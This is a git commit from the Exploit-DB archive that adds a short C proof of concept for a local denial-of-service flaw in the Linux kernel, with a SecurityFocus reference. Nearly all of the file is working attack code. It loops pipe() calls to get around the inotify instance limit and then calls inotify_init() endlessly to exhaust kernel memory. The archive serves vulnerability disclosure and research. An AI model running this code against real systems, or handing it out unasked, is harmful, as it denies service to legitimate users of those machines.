4c02ce5463f43e147c64c59c742368d029d9ef7e
Offensive Security <info@exploit-db.com>
2014-12-25 04:53:38 +0000

    Updated 12_25_2014

---
+++ platforms/linux/dos/35600.c
@@ -0,0 +1,22 @@
+source: http://www.securityfocus.com/bid/47296/info
+
+The Linux kernel is prone to a local denial-of-service vulnerability.
+
+Attackers can exploit this issue to cause an out-of-memory condition, denying service to legitimate users. 
+
+#include <sys/inotify.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[])
+{
+        int fds[2];
+
+        /* Circumvent max inotify instances limit */
+        while (pipe(fds) != -1)
+                ;
+
+        while (1)
+                inotify_init();
+
+        return 0;
+}
